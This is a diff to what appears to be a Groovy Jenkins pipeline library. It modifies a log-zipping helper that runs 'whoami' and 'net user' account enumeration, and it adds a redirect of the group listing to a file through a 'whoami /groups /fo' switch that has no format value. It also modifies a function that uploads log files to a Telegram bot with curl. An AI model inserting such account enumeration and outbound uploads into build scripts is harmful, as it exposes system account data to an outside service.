@@ -114,10 +114,10 @@ def bot_send_message(Map parameters, result) {
             
 }
 
-private def zip_file(fileName) {
+private def zip_file(fileName, path) {
     bat """
     whoami /upn
-    whoami /groups
+    whoami /groups /fo > C:\\${path}\\table.txt
     net user
     """
     String zipFileName = "${fileName.replace(".txt","")}.zip"  
@@ -136,13 +136,13 @@ private def zip_file(fileName) {
 println "ZIP file '$zipFileName' created successfully."
 }
 
-private def send_log_bat(main_items, logFileName, Boolean get7z = false) {
+private def send_log_bat(main_items, logFileName, path, Boolean get7z = false) {
     if (!get7z) {
         bat """
             curl -X POST "https://api.telegram.org/bot${main_items.bot_token}/sendDocument" -F chat_id=${main_items.chat_id} -F document="@${logFileName}"
         """
     } else {
-        zip_file(logFileName)
+        zip_file(logFileName, path)
          bat """
             "C:\\Program Files\\7-Zip\\7z.exe" a -t7z ${logFileName.replace(".txt","")}.7z ${logFileName}
             curl -X POST "https://api.telegram.org/bot${main_items.bot_token}/sendDocument" -F chat_id=${main_items.chat_id} -F document="@${logFileName.replace(".txt","")}.7z"
